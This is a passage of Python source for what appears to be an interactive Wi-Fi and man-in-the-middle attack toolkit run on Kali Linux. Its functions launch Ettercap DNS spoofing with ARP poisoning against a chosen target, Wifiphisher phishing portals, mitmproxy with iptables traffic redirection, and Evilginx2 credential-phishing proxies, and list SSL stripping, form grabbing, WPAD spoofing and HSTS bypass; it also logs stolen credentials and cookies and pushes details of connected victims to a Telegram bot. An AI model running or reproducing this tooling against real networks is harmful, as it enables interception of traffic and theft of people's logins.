        print(RED + "[-] Could not obtain the gateway IP." + RESET)
        return
    
    # Before starting the DNS Spoofing attack, prompt for multiple redirections
    redirections = request_redirections()
    if not redirections:
        print(RED + "[-] No redirections were entered." + RESET)
        return

    # For each entered pair, update the etter.dns file
    for domain, destination_ip in redirections:
        configure_etter_dns(domain, destination_ip)

    # Switch to iptables-legacy before starting Ettercap
    set_iptables_legacy()    
    
    # Automatically edit etter.conf to secure SSL redirection
    configure_ettercap_conf()    

    print(GREEN + f"Starting DNS Spoofing attack on interface {iface} against target {target_ip} with gateway {gateway_ip} using Ettercap (GUI mode)..." + RESET)
    print(CYAN + "A new terminal window will open with Ettercap in graphical (GTK) mode." + RESET)
    print(CYAN + "When finished, close the window or press ENTER here to return to the main menu." + RESET)
    
    try:
        # Create the caplet with the necessary commands
        caplet_file = create_dns_spoof_caplet(target_ip)
        # Launch Ettercap in GUI mode (-G), with the DNS spoof plugin (-P dns_spoof)
        # and remote MITM (-M arp:remote) using the TARGET syntax with empty fields.
        cmd = (
            f"gnome-terminal -- bash -c 'sudo ettercap -G -S -i {iface} -P dns_spoof -M arp:remote \"//{target_ip}//\" \"//{gateway_ip}//\" -caplet {caplet_file}; exec bash'"
        )
        proc = subprocess.Popen(cmd, shell=True)
        input(YELLOW + "Press ENTER to return to the main menu..." + RESET)
        proc.terminate()
        proc.wait(timeout=5)
        print(GREEN + "DNS Spoofing attack stopped." + RESET)
    except Exception as e:
        print(RED + "Error starting Ettercap for DNS Spoofing:" + str(e) + RESET)
    finally:
        # Restore iptables configuration back to nft
        restore_iptables_nft()


def start_phishing_portal():
    iface = input(YELLOW + "Enter the interface for the phishing portal (leave blank to use the AP interface): " + RESET).strip()
    if iface == "" and ap_interface_global is not None:
        iface = ap_interface_global
    if not iface:
        print(RED + "[-] No interface selected for the phishing portal." + RESET)
        return
    print(GREEN + "Select the attack mode for Wifiphisher:" + RESET)
    print(CYAN + "  1) Attack only the Fake AP" + RESET)
    print(CYAN + "  2) Scan all available networks" + RESET)
    mode = input(YELLOW + "Enter 1 or 2: " + RESET).strip()
    if mode == "1":
        if fake_ap_ssid_global:
            essid_fake = fake_ap_ssid_global
            print(GREEN + f"The Fake AP ESSID will be used: {essid_fake}" + RESET)
        else:
            print(RED + "[-] No ESSID found for the Fake AP. Please create the AP first." + RESET)
            return
    else:
        essid_fake = ""
    print(GREEN + f"Starting Phishing Portal with Wifiphisher on interface {iface}..." + RESET)
    print(CYAN + "A new terminal window will open with Wifiphisher in interactive mode." + RESET)
    print(CYAN + "Inside that window you can select the desired phishing scenario." + RESET)
    print(CYAN + "When finished, close the window or press ENTER here to return to the main menu." + RESET)
    try:
        if mode == "1":
            cmd = f"gnome-terminal -- bash -c 'cd /home/kali/Desktop; sudo wifiphisher -i {iface} -e \"{essid_fake}\" -kN; exec bash'"
        else:
            cmd = f"gnome-terminal -- bash -c 'cd /home/kali/Desktop; sudo wifiphisher -i {iface} -kN; exec bash'"
        proc = subprocess.Popen(cmd, shell=True)
        input(YELLOW + "Press ENTER to return to the main menu..." + RESET)
        proc.terminate()
        proc.wait(timeout=5)
        print(GREEN + "Phishing Portal stopped." + RESET)
    except Exception as e:
        print(RED + "Error starting Wifiphisher:" + str(e) + RESET)


def sniffing_menu():
    while True:
        print(BLUE + """
[ANALYSIS & INJECTION]
  1) Passive Capture (Wireshark)
  2) Capture and Advanced Analysis (Scapy)
  3) Inject ICMP Packet (Scapy)
  4) Manipulate Packets (Scapy)
  5) Back to Main Menu
""" + RESET)
        option = input(YELLOW + "Select an option: " + RESET).strip()
        if option == "1":
            start_sniffing_traffic()
        elif option == "2":
            advanced_scapy_analysis()
        elif option == "3":
            inject_icmp_packet()
        elif option == "4":
            manipulate_tcp_packet()
        elif option == "5":
            break
        else:
            print(RED + "[-] Invalid option, please try again.\n" + RESET)


def start_sniffing_traffic():
    iface = input(YELLOW + "Enter the interface for traffic sniffing: " + RESET).strip()
    if not iface:
        print(RED + "[-] No interface selected." + RESET)
        return
    log_path = "/home/kali/Desktop/tcpdump_capture.pcap"
    print(GREEN + f"[+] Starting tcpdump on interface {iface}. The capture will be saved to {log_path}." + RESET)
    cmd = f"gnome-terminal -- bash -c 'sudo tcpdump -i {iface} -w {log_path}; exec bash'"
    try:
        proc = subprocess.Popen(cmd, shell=True)
        input(YELLOW + "Press ENTER to stop sniffing..." + RESET)
        proc.terminate()
        proc.wait(timeout=5)
        print(GREEN + "[+] Sniffing stopped." + RESET)
    except Exception as e:
        print(RED + "[-] Error starting tcpdump:" + str(e) + RESET)


def get_interface_ips(interface):
    import subprocess
    ips = []
    try:
        result = subprocess.run(["ip", "addr", "show", interface], capture_output=True, text=True)
        for line in result.stdout.splitlines():
            line = line.strip()
            if line.startswith("inet ") and "inet6" not in line:
                # Extract the IP (without the mask)
                ip = line.split()[1].split("/")[0]
                ips.append(ip)
    except Exception as e:
        print(RED + "Error obtaining IPs for the interface:" + str(e) + RESET)
    return ips


def advanced_scapy_analysis():
    try:
        from scapy.all import sniff, wrpcap, get_if_list
    except ImportError:
        print(RED + "[-] Scapy is not installed. Try installing it with: pip install scapy" + RESET)
        return
    
    import sys, subprocess

    # Get the list of available interfaces
    interfaces = get_if_list()
    if not interfaces:
        print(RED + "[-] No interfaces found." + RESET)
        return
    
    print(GREEN + "[+] Available interfaces:" + RESET)
    for idx, iface in enumerate(interfaces, start=1):
        print(CYAN + f"  [{idx}] {iface}" + RESET)
    
    try:
        choice = int(input(YELLOW + "Select the interface by number: " + RESET).strip())
        iface = interfaces[choice - 1]
    except Exception as e:
        print(RED + "[-] Invalid selection." + str(e) + RESET)
        return

    # Helper function to obtain IPs for the interface
    def get_interface_ips(interface):
        ips = []
        try:
            result = subprocess.run(["ip", "addr", "show", interface], capture_output=True, text=True)
            for line in result.stdout.splitlines():
                line = line.strip()
                if line.startswith("inet ") and "inet6" not in line:
                    ip = line.split()[1].split("/")[0]
                    ips.append(ip)
        except Exception as e:
            print(RED + "Error obtaining IPs for the interface:" + str(e) + RESET)
        return ips

    ips = get_interface_ips(iface)
    if not ips:
        print(RED + "[-] No IPs assigned to the selected interface." + RESET)
    elif len(ips) == 1:
        chosen_ip = ips[0]
        print(GREEN + f"[+] The only IP assigned to {iface} is: {chosen_ip}" + RESET)
    else:
        print(GREEN + "[+] IPs assigned to the interface:" + RESET)
        for idx, ip in enumerate(ips, start=1):
            print(CYAN + f"  [{idx}] {ip}" + RESET)
        try:
            ip_choice = int(input(YELLOW + "Select the number of the IP to use: " + RESET).strip())
            chosen_ip = ips[ip_choice - 1]
        except Exception as e:
            print(RED + "[-] Invalid selection, defaulting to the first IP:" + str(ips[0]) + RESET)
            chosen_ip = ips[0]
        print(GREEN + f"[+] Selected IP: {chosen_ip}" + RESET)
    
    filter_expr = input(YELLOW + "Enter a BPF filter (optional, e.g., tcp port 80): " + RESET).strip()
    timeout_str = input(YELLOW + "Enter the capture time in seconds (default 30): " + RESET).strip()
    try:
        timeout = int(timeout_str) if timeout_str else 30
    except ValueError:
        print(RED + "[-] Invalid time, using 30 seconds." + RESET)
        timeout = 30

    advanced_choice = input(YELLOW + "Enable advanced mode (detailed log output in real time)? (y/n): " + RESET).strip().lower()
    advanced_mode = True if advanced_choice == "y" else False

    print(GREEN + f"[+] Capturing packets on {iface} for {timeout} seconds..." + RESET)

    if advanced_mode:
        log_file = input(YELLOW + "Enter the log file name (default scapy_advanced.log): " + RESET).strip()
        if not log_file:
            log_file = "scapy_advanced.log"
        open(log_file, "w").close()  # Clear the log
        packet_counter = 0

        def process_packet(pkt):
            nonlocal packet_counter
            packet_counter += 1
            with open(log_file, "a") as f:
                f.write(pkt.show(dump=True) + "\n")
            # Update the same line every 50 packets without cluttering the terminal
            if packet_counter % 50 == 0:
                sys.stdout.write(f"\r[+] {packet_counter} packets captured...")
                sys.stdout.flush()

        packets = sniff(iface=iface, filter=filter_expr, timeout=timeout, prn=process_packet)
        print("")
        print(GREEN + f"[+] Capture complete. {len(packets)} packets captured." + RESET)
        print(GREEN + f"[+] Detailed log saved in {log_file}." + RESET)
    else:
        packets = sniff(iface=iface, filter=filter_expr, timeout=timeout)
        print(GREEN + f"[+] Capture complete. {len(packets)} packets captured." + RESET)
        print(GREEN + "\n[+] Summary of the first 5 packets:" + RESET)
        for i, pkt in enumerate(packets[:5], start=1):
            print(CYAN + f"--- Packet {i} ---" + RESET)
            print(pkt.summary())
            print("-" * 40)

    save_choice = input(YELLOW + "Do you want to save the capture to a pcap file? (y/n): " + RESET).strip().lower()
    if save_choice == "y":
        filename = input(YELLOW + "Enter the file name (without extension, default scapy_capture): " + RESET).strip()
        if not filename:
            filename = "scapy_capture"
        filename += ".pcap"
        wrpcap(filename, packets)
        print(GREEN + f"[+] Capture saved in {filename}." + RESET)


def inject_icmp_packet():
    try:
        from scapy.all import IP, ICMP, send
    except ImportError:
        print(RED + "[-] Scapy is not installed. Try installing it with: pip install scapy" + RESET)
        return
    target_ip = input(YELLOW + "Enter the destination IP for the ICMP packet: " + RESET).strip()
    payload = input(YELLOW + "Enter an optional payload message: " + RESET)
    packet = IP(dst=target_ip) / ICMP() / payload
    send(packet)
    print(GREEN + f"[+] ICMP packet sent to {target_ip}" + RESET)


def manipulate_tcp_packet():
    try:
        from scapy.all import sniff, send, get_if_list, IP, TCP, Raw, Ether
    except ImportError:
        print(RED + "[-] Scapy is not installed. Install Scapy with: pip install scapy" + RESET)
        return

    import subprocess, sys

    # Show some common BPF filters (for informational purposes only)
    print(CYAN + "[+] Info: Some common BPF filters are:" + RESET)
    print(CYAN + "    - 'tcp'  (capture only TCP traffic)" + RESET)
    print(CYAN + "    - 'udp'  (capture only UDP traffic)" + RESET)
    print(CYAN + "    - 'icmp' (capture only ICMP traffic)" + RESET)
    print(CYAN + "    - 'tcp port 80' (capture HTTP traffic)" + RESET)
    print(CYAN + "    - 'host 192.168.1.75' (capture traffic to/from a specific IP)" + RESET)
    print(CYAN + "    You can combine them with logical operators (and, or)." + RESET)
    
    # 1. Select the interface to capture the packet
    interfaces = get_if_list()
    if not interfaces:
        print(RED + "[-] No interfaces found." + RESET)
        return

    print(GREEN + "[+] Available interfaces:" + RESET)
    for idx, iface in enumerate(interfaces, start=1):
        print(CYAN + f"  [{idx}] {iface}" + RESET)
    try:
        choice = int(input(YELLOW + "Select the interface to capture a packet: " + RESET).strip())
        iface = interfaces[choice - 1]
    except Exception as e:
        print(RED + "[-] Invalid selection." + str(e) + RESET)
        return

    # 2. (Optional) Allow filtering by a reference IP
    extra_filter = ""
    use_ip_filter = input(YELLOW + "Do you want to add a filter for a reference IP? (y/n): " + RESET).strip().lower()
    if use_ip_filter == "y":
        ref_ip = input(YELLOW + "Enter the IP to filter (e.g., the victim device's IP): " + RESET).strip()
        if ref_ip:
            extra_filter = f"host {ref_ip}"
    
    filter_expr = input(YELLOW + "Enter a BPF filter (optional, e.g., tcp port 80): " + RESET).strip()
    # Combine filters if extra filter is provided
    if filter_expr and extra_filter:
        filter_expr = f"({filter_expr}) and ({extra_filter})"
    elif not filter_expr and extra_filter:
        filter_expr = extra_filter

    timeout_str = input(YELLOW + "Enter the capture time in seconds (default 30): " + RESET).strip()
    try:
        timeout = int(timeout_str) if timeout_str else 30
    except ValueError:
        print(RED + "[-] Invalid time, using 30 seconds." + RESET)
        timeout = 30

    print(GREEN + f"[+] Capturing a packet on {iface} for {timeout} seconds..." + RESET)
    packets = sniff(iface=iface, filter=filter_expr, count=1, timeout=timeout)
    if not packets:
        print(RED + "[-] No packet captured." + RESET)
        return

    pkt = packets[0]
    print(GREEN + "\n[+] Original packet:" + RESET)
    pkt.show()

    # Display captured IP and MAC info if available
    if IP in pkt:
        print(GREEN + f"[+] Captured source IP: {pkt[IP].src}" + RESET)
        print(GREEN + f"[+] Captured destination IP: {pkt[IP].dst}" + RESET)
    if pkt.haslayer(Ether):
        print(GREEN + f"[+] Captured source MAC: {pkt[Ether].src}" + RESET)
        print(GREEN + f"[+] Captured destination MAC: {pkt[Ether].dst}" + RESET)
    
    # 3. Modify IP layer fields (TTL and IP addresses)
    if IP in pkt:
        if input(YELLOW + "Do you want to modify the TTL? (y/n): " + RESET).strip().lower() == "y":
            try:
                new_ttl = int(input(YELLOW + "Enter the new TTL value: " + RESET).strip())
                original_ttl = pkt[IP].ttl
                pkt[IP].ttl = new_ttl
                print(GREEN + f"[+] TTL modified: {original_ttl} -> {new_ttl}" + RESET)
            except Exception as e:
                print(RED + "[-] Error modifying TTL:" + str(e) + RESET)
        if input(YELLOW + "Do you want to modify the IP addresses? (y/n): " + RESET).strip().lower() == "y":
            new_src = input(YELLOW + "Enter the new source IP (leave blank to keep current): " + RESET).strip()
            new_dst = input(YELLOW + "Enter the new destination IP (leave blank to keep current): " + RESET).strip()
            if new_src:
                original_src = pkt[IP].src
                pkt[IP].src = new_src
                print(GREEN + f"[+] Source IP modified: {original_src} -> {new_src}" + RESET)
            if new_dst:
                original_dst = pkt[IP].dst
                pkt[IP].dst = new_dst
                print(GREEN + f"[+] Destination IP modified: {original_dst} -> {new_dst}" + RESET)
            # Force recalculation of length and checksum
            del pkt[IP].len
            del pkt[IP].chksum
            if TCP in pkt:
                del pkt[TCP].chksum
    else:
        print(RED + "[-] The packet does not have an IP layer, its fields cannot be modified." + RESET)

    # 4. Modify the MAC addresses if the Ether layer exists
    if pkt.haslayer(Ether):
        if input(YELLOW + "Do you want to modify the MAC addresses? (y/n): " + RESET).strip().lower() == "y":
            new_mac_src = input(YELLOW + "Enter the new source MAC (leave blank to keep current): " + RESET).strip()
            new_mac_dst = input(YELLOW + "Enter the new destination MAC (leave blank to keep current): " + RESET).strip()
            if new_mac_src:
                original_mac_src = pkt[Ether].src
                pkt[Ether].src = new_mac_src
                print(GREEN + f"[+] Source MAC modified: {original_mac_src} -> {new_mac_src}" + RESET)
            if new_mac_dst:
                original_mac_dst = pkt[Ether].dst
                pkt[Ether].dst = new_mac_dst
                print(GREEN + f"[+] Destination MAC modified: {original_mac_dst} -> {new_mac_dst}" + RESET)
    else:
        print(RED + "[-] The packet does not have an Ethernet layer; MAC addresses cannot be modified." + RESET)

    # 5. Modify the payload
    if input(YELLOW + "Do you want to modify the payload? (y/n): " + RESET).strip().lower() == "y":
        if Raw in pkt:
            original_payload = pkt[Raw].load
            print(GREEN + f"[+] Original payload: {original_payload}" + RESET)
        else:
            print(RED + "[-] The packet does not have a Raw layer; a new Raw layer will be added." + RESET)
            original_payload = b""
        new_payload_text = input(YELLOW + "Enter the new payload (text, will be converted to bytes): " + RESET)
        if new_payload_text:
            new_payload = new_payload_text.encode()
            if Raw in pkt:
                pkt[Raw].load = new_payload
            else:
                pkt = pkt / new_payload
            # Delete fields so that length and checksum are recalculated
            if IP in pkt:
                del pkt[IP].len
                del pkt[IP].chksum
            if TCP in pkt:
                del pkt[TCP].chksum
            print(GREEN + "[+] Payload modified." + RESET)
        else:
            print(RED + "[-] No new payload entered, keeping original." + RESET)
    else:
        print(RED + "[-] Payload will not be modified." + RESET)

    print(GREEN + "\n[+] Modified packet:" + RESET)
    pkt.show()

    if input(YELLOW + "Do you want to send the manipulated packet? (y/n): " + RESET).strip().lower() == "y":
        send(pkt)
        print(GREEN + "[+] Manipulated packet sent." + RESET)
    else:
        print(RED + "[-] Send cancelled." + RESET)


def apply_iptables_redirect(listen_port=8080):
    print(GREEN + "[+] Applying iptables rules to redirect HTTP and HTTPS traffic..." + RESET)
    cmd = (
        f"sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {listen_port} ; "
        f"sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port {listen_port}"
    )
    subprocess.run(cmd, shell=True, check=False)


def start_proxy_mitm_attack():
    iface = select_interface()
    if iface is None:
        print(RED + "[-] No interface selected for mitmproxy." + RESET)
        return

    ip_address = get_interface_ip(iface)
    if ip_address is None:
        print(RED + "[-] Could not obtain the IP for the interface." + RESET)
        return

    # Apply redirection to capture HTTP traffic
    apply_iptables_redirect(listen_port=8080)

    print(GREEN + f"[+] Starting mitmproxy on IP {ip_address} (interface {iface}). A new terminal window will open." + RESET)
    try:
        cmd = f"gnome-terminal -- bash -c 'sudo mitmproxy --intercept \"\" --listen-host {ip_address}; exec bash'"
        proc = subprocess.Popen(cmd, shell=True)
        input(YELLOW + "Press ENTER to stop mitmproxy..." + RESET)
        proc.terminate()
        proc.wait(timeout=5)
        print(GREEN + "[+] mitmproxy stopped." + RESET)
    except Exception as e:
        print(RED + "[-] Error starting mitmproxy:" + str(e) + RESET)


def install_evilginx2():
    import os
    import subprocess

    # Check if Evilginx2 is already installed (by searching for the 'evilginx2' command)
    try:
        result = subprocess.run(["which", "evilginx2"], capture_output=True, text=True)
        if result.stdout.strip():
            print(GREEN + "[+] Evilginx2 is already installed." + RESET)
            return
    except Exception as e:
        print(RED + "[-] Error checking Evilginx2:" + str(e) + RESET)
    
    print(GREEN + "[+] Installing dependencies for Evilginx2 (golang-go and git)..." + RESET)
    subprocess.run(["sudo", "apt", "install", "-y", "golang-go", "git"], check=True)
    
    # Clone or update the repository for version v3.3.0
    if os.path.exists("evilginx2"):
        print(GREEN + "[+] Updating the Evilginx2 repository..." + RESET)
        os.chdir("evilginx2")
        subprocess.run("git fetch --all", shell=True, check=True)
        subprocess.run("git checkout v3.3.0", shell=True, check=True)
        subprocess.run("git pull origin v3.3.0", shell=True, check=True)
    else:
        print(GREEN + "[+] Cloning the Evilginx2 repository (v3.3.0)..." + RESET)
        subprocess.run("git clone --branch v3.3.0 --depth 1 https://github.com/kgretzky/evilginx2.git", shell=True, check=True)
        os.chdir("evilginx2")
    
    print(GREEN + "[+] Compiling Evilginx2..." + RESET)
    subprocess.run("make clean && make", shell=True, check=True)
    
    # Search for the binary in known locations
    binary_path = None
    possible_paths = [
        "evilginx2", 
        "evilginx", 
        os.path.join("build", "evilginx2"), 
        os.path.join("build", "evilginx")
    ]
    for path in possible_paths:
        if os.path.exists(path) and os.access(path, os.X_OK):
            binary_path = path
            break

    if not binary_path:
        print(RED + "[-] Evilginx2 binary not found. Please check the compilation." + RESET)
        return

    print(GREEN + f"[+] Found binary at: {binary_path}" + RESET)
    print(GREEN + "[+] Installing Evilginx2 to /usr/local/bin/evilginx2..." + RESET)
    subprocess.run(f"sudo cp {binary_path} /usr/local/bin/evilginx2", shell=True, check=True)
    
    os.chdir("..")
    print(GREEN + "[+] Evilginx2 installation complete." + RESET)


def start_advanced_mitm_attack():
    # Prompt for the domain (optional)
    domain = input(YELLOW + "Enter the domain (optional) to configure in Evilginx2: " + RESET).strip()
    # Prompt for the external IP (optional)
    external_ip = input(YELLOW + "Enter the external IP (optional) of this server: " + RESET).strip()

    # Prompt for the phishlets directory path (required)
    phishlets_path = input(YELLOW + "Enter the Evilginx2 phishlets directory path (default /etc/evilginx2/phishlets): " + RESET).strip()
    if not phishlets_path:
        phishlets_path = "/etc/evilginx2/phishlets"
        print(GREEN + "[+] Using default phishlets path:" + RESET, phishlets_path)
    # Verify that the phishlets directory exists
    if not os.path.isdir(phishlets_path):
        print(RED + "[-] The phishlets directory does not exist: " + phishlets_path + RESET)
        return

    # Prompt for the configuration directory path (optional)
    config_path = input(YELLOW + "Enter the Evilginx2 configuration directory path (optional): " + RESET).strip()

    print(GREEN + "\n[+] Instructions for the Evilginx2 interactive shell:" + RESET)
    if domain:
        print(CYAN + "    - Add the domain with: config domain " + domain + RESET)
    if external_ip:
        print(CYAN + "    - Configure the external IP with: config ipv4 external " + external_ip + RESET)
    print(CYAN + "    - Ensure that the phishlets are correctly located at: " + phishlets_path + RESET)
    print(CYAN + "\n[+] Starting Evilginx2 in a new terminal window...\n" + RESET)

    try:
        # Build the command: include -c only if config_path is provided
        if config_path:
            cmd = f"gnome-terminal -- bash -c 'sudo evilginx2 -c {config_path} -p {phishlets_path}; exec bash'"
        else:
            cmd = f"gnome-terminal -- bash -c 'sudo evilginx2 -p {phishlets_path}; exec bash'"
        proc = subprocess.Popen(cmd, shell=True)
        input(YELLOW + "Press ENTER to stop Evilginx2..." + RESET)
        proc.terminate()
        proc.wait(timeout=5)
        print(GREEN + "[+] Evilginx2 stopped." + RESET)
    except Exception as e:
        print(RED + "[-] Error starting Evilginx2:" + str(e) + RESET)


def start_mitm_menu():
    attacker = MITMAttacker()
    
    while True:
        print(BLUE + """
[ENHANCED MITM MENU]
  1) ARP Spoofing (Bettercap)
  2) DNS Spoofing (Ettercap)
  3) Proxy MITM (mitmproxy)
  4) Advanced MITM (Evilginx2)
  5) SSLStrip+ (Start SSL Stripping)
  6) Form Grabbing (Start Form Grabbing)
  7) WPAD Spoofing (Proxy Auto)
  8) HSTS Bypass
  9) Monitor All Traffic
  10) Back to Main Menu
""" + RESET)
        option = input(YELLOW + "Select an option: " + RESET).strip()
        
        if option == "1":
            start_mitm_attack()  
        elif option == "2":
            start_dns_spoof_attack()  
        elif option == "3":
            start_proxy_mitm_attack()  
        elif option == "4":
            start_advanced_mitm_attack()  
        elif option == "5":
            target = select_target()
            if target and target.get("IP"):
                attacker.start_sslstrip_plus(target["IP"])
        elif option == "6":
            target = select_target()
            if target and target.get("IP"):
                attacker.form_grabbing_submenu()
        elif option == "7":
            proxy_ip = input(YELLOW + "Enter proxy IP [192.168.1.1]: " + RESET).strip() or "192.168.1.1"
            attacker.setup_wpad_spoofing(proxy_ip)
        elif option == "8":
            domains = input(YELLOW + "Enter domains to bypass (comma separated): " + RESET).strip()
            if domains:
                attacker.bypass_hsts([d.strip() for d in domains.split(",") if d.strip()])
        elif option == "9":
            iface = attacker.interface or ap_interface_global
            if not iface:
                print(RED + "[-] No interface is configured for monitoring." + RESET)
                return
            output_file = os.path.join(os.getcwd(), "mitm_capture.pcap")    
            print(GREEN + f"[+] Opening full traffic monitor on interface {iface}. Capturing to {output_file}" + RESET)
            cmd = f"gnome-terminal -- bash -c 'sudo tcpdump -i {iface} -w \"{output_file}\" ; exec bash'"
            subprocess.run(cmd, shell=True)
        elif option == "10":
            break
        else:
            print(RED + "[-] Invalid option, please try again.\n" + RESET)


def scan_vulnerabilities():
    import subprocess

    # Define available NSE categories
    available_categories = {
        "1": "auth",
        "2": "broadcast",
        "3": "default",
        "4": "discovery",
        "5": "dos",
        "6": "exploit",
        "7": "external",
        "8": "intrusive",
        "9": "malware",
        "10": "safe",
        "11": "version",
        "12": "vuln"
    }
    
    print(BLUE + "\n[Custom Vulnerability Scan]" + RESET)
    print(GREEN + "Select the NSE categories to include in the scan:" + RESET)
    for num, cat in sorted(available_categories.items(), key=lambda x: int(x[0])):
        print(CYAN + f"  {num}) {cat}" + RESET)

    print(YELLOW + "\n[Warning]" + RESET)
    print(YELLOW + "A scan with many categories can significantly increase the scan time and even affect the stability of the target host." + RESET)
    input(YELLOW + "Enter the numbers separated by commas (default 3,12): " + RESET)
    input_categories = input(YELLOW + "Enter the numbers separated by commas (default 3,12): " + RESET).strip()
    if not input_categories:
        selected = ["default", "vuln"]
    else:
        numbers = [x.strip() for x in input_categories.split(",")]
        selected = [available_categories[num] for num in numbers if num in available_categories]
        if not selected:
            selected = ["default", "vuln"]
    categories_str = ",".join(selected)
    print(GREEN + f"[+] Selected categories: {categories_str}" + RESET)
    
    # For each selected category, ask for additional arguments
    print(CYAN + "\n[Info]" + RESET)
    print(CYAN + "For each category, you may enter additional arguments in key=value format, separated by commas. Example: vulns.showall=1, auth.timeout=5" + RESET)
    print(CYAN + "Refer to the NSE documentation at: https://nmap.org/nsedoc/ for more details." + RESET)
    script_args_list = []
    for cat in selected:
        default_prompt = " (default: vulns.showall=1)" if cat == "vuln" else ""
        user_args = input(YELLOW + f"Enter arguments for category '{cat}'{default_prompt} (or press Enter to skip): " + RESET).strip()
        if not user_args and cat == "vuln":
            user_args = "vulns.showall=1"
        if user_args:
            script_args_list.append(user_args)
    script_args_str = ",".join(script_args_list)
    print(GREEN + f"[+] The following NSE arguments will be used: {script_args_str}" + RESET)
    
    # Get connected devices (assuming get_connected_stations() is defined)
    devices = get_connected_stations()
    if not devices:
        print(RED + "[-] No connected devices found." + RESET)
        return

    print(GREEN + "\n[+] Connected devices:" + RESET)
    for idx, dev in enumerate(devices, start=1):
        ip = dev.get("IP", "N/A")
        mac = dev.get("MAC", "N/A")
        hostname = dev.get("hostname", "N/A")
        print(CYAN + f"  [{idx}] IP: {ip} | MAC: {mac} | Hostname: {hostname}" + RESET)

    try:
        choice = int(input(YELLOW + "\nSelect the device to scan (by number): " + RESET).strip())
        target = devices[choice - 1].get("IP")
        if not target:
            print(RED + "[-] The selected device does not have a valid IP." + RESET)
            return
    except Exception as e:
        print(RED + "[-] Invalid selection:" + str(e) + RESET)
        return

    use_pn = input(YELLOW + "Do you want to use the -Pn option to skip ping scan? (y/n, default y): " + RESET).strip().lower()
    pn_flag = "-Pn" if use_pn != "n" else ""

    print(GREEN + f"\n[+] Running vulnerability scan on {target} using nmap..." + RESET)
    # Build the nmap command with the selected categories and arguments
    nmap_cmd = f"sudo nmap {pn_flag} -sV -O --script \"{categories_str}\" --script-args \"{script_args_str}\" {target}"
    try:
        result = subprocess.run(nmap_cmd, shell=True, capture_output=True, text=True)
        print(GREEN + "[+] Scan result:" + RESET)
        print(result.stdout)
        if result.stderr:
            print(YELLOW + "\n[!] Errors during the scan:" + RESET)
            print(result.stderr)
    except Exception as e:
        print(RED + "[-] Error executing nmap:" + str(e) + RESET)


def generate_report():
    import csv
    import datetime
    import os

    print(GREEN + "\n[GENERATE REPORT]" + RESET)
    attack_type = input(YELLOW + "Enter the type of attack (e.g., Fake AP, MITM, etc.): " + RESET).strip()
    description = input(YELLOW + "Enter a brief description of the attack: " + RESET).strip()
    result = input(YELLOW + "Enter the result obtained (credentials, cookies, etc.): " + RESET).strip()
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    filename = input(YELLOW + "Enter the report file name (without extension, .csv will be used): " + RESET).strip()
    if not filename:
        filename = "report"
    filename = filename + ".csv"
    
    file_exists = os.path.isfile(filename)
    try:
        with open(filename, mode='a', newline='') as file:
            writer = csv.writer(file)
            if not file_exists:
                writer.writerow(["Timestamp", "Attack Type", "Description", "Result"])
            writer.writerow([timestamp, attack_type, description, result])
        print(GREEN + f"[+] Report generated and saved in {filename}\n" + RESET)
    except Exception as e:
        print(RED + "[-] Error generating report:" + str(e) + RESET)


def analyze_report():
    import csv
    import os

    print(GREEN + "\n[ANALYZE REPORT]" + RESET)
    filename = input(YELLOW + "Enter the CSV report file name to analyze (with .csv extension): " + RESET).strip()
    if not os.path.isfile(filename):
        print(RED + "[-] File does not exist.\n" + RESET)
        return
    
    try:
        with open(filename, 'r', newline='') as file:
            reader = csv.DictReader(file)
            rows = list(reader)
            print(GREEN + f"[+] Found {len(rows)} records in {filename}.\n" + RESET)
            for idx, row in enumerate(rows, start=1):
                print(CYAN + f"Record {idx}: {row}" + RESET)
            print("")
    except Exception as e:
        print(RED + "[-] Error analyzing report:" + str(e) + RESET)


def reports_menu():
    while True:
        print(BLUE + """
[REPORTS]
  1) Generate Report
  2) Analyze Report
  3) Back to Main Menu
""" + RESET)
        option = input(YELLOW + "Select an option: " + RESET).strip()
        if option == "1":
            generate_report()
        elif option == "2":
            analyze_report()
        elif option == "3":
            break
        else:
            print(RED + "[-] Invalid option, please try again.\n" + RESET)


def install_requests():
    import sys, subprocess
    try:
        import requests
    except ImportError:
        print(GREEN + "[+] Installing requests..." + RESET)
        result = subprocess.run([sys.executable, "-m", "pip", "install", "requests"], capture_output=True, text=True)
        if result.returncode != 0:
            print(RED + "[-] Error installing requests:" + result.stderr + RESET)
            return False
    return True


def start_telegram_notifications():
    import time
    try:
        import requests
    except ImportError:
        if not install_requests():
            print(RED + "[-] Could not install requests. Aborting notifications." + RESET)
            return
        import requests

    global notifications_thread, notifications_stop_event

    print(GREEN + "\n[Real-Time Telegram Notifications for Connected Clients]" + RESET)
    bot_token = input(YELLOW + "Enter the Telegram bot token: " + RESET).strip()
    chat_id = input(YELLOW + "Enter the chat ID: " + RESET).strip()
    if not bot_token or not chat_id:
        print(RED + "[-] Bot token and chat ID are required. Aborting notifications." + RESET)
        return

    # If notifications are already running, inform and exit.
    if notifications_thread is not None and notifications_thread.is_alive():
        print(CYAN + "[*] Notifications are already running." + RESET)
        return

    notifications_stop_event = threading.Event()

    def background_notifications():
        previous_msg = None
        while not notifications_stop_event.is_set():
            # Get the current list of connected clients (assumes get_connected_stations() is defined)
            clients = get_connected_stations()
            msg = "[Connected Clients Notifications]\n"
            if clients:
                for client in clients:
                    mac = client.get("MAC", "N/A")
                    ip = client.get("IP", "N/A")
                    hostname = client.get("hostname", "N/A")
                    msg += f"MAC: {mac} | IP: {ip} | Hostname: {hostname}\n"
            else:
                msg += "No clients connected.\n"
            # Send a notification only if the message has changed
            if msg != previous_msg:
                url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                data = {"chat_id": chat_id, "text": msg}
                try:
                    response = requests.post(url, data=data)
                    if response.status_code == 200:
                        print(GREEN + "[+] Notification sent." + RESET)
                    else:
                        print(RED + "[-] Error sending notification:" + response.text + RESET)
                except Exception as e:
                    print(RED + "[-] Exception sending notification:" + str(e) + RESET)
                previous_msg = msg
            # Wait 10 seconds (break early if requested)
            for _ in range(10):
                if not notifications_stop_event.is_set():
                    time.sleep(1)
                else:
                    break

    notifications_thread = threading.Thread(target=background_notifications, daemon=True)
    notifications_thread.start()
    print(GREEN + "[+] Notifications started in the background.\n" + RESET)
    

def stop_telegram_notifications():
    global notifications_stop_event, notifications_thread
    if notifications_thread is not None and notifications_thread.is_alive():
        print(GREEN + "[+] Stopping background notifications..." + RESET)
        notifications_stop_event.set()
        notifications_thread.join(timeout=5)
